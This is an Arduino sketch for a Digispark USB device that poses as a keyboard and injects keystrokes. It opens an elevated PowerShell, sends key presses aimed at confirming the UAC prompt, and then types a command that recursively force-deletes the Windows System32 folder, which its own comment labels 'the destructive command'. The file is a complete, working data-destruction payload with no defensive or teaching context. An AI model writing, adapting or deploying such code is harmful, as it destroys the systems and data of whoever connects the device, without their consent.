#include "DigiKeyboard.h"

void setup() {
  // Wait for the system to recognize the device
  DigiKeyboard.delay(10000);

  // Open PowerShell as an administrator
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Open Run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell Start-Process powershell -Verb runAs"); // Run PowerShell as admin
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // Wait for UAC prompt (adjust as necessary)
  DigiKeyboard.sendKeyStroke(KEY_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Confirm UAC (if possible)

  DigiKeyboard.delay(2000);

  // Send the destructive command
  DigiKeyboard.print("Remove-Item -Path \"C:\\Windows\\System32\" -Recurse -Force");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // nothing to do here
}
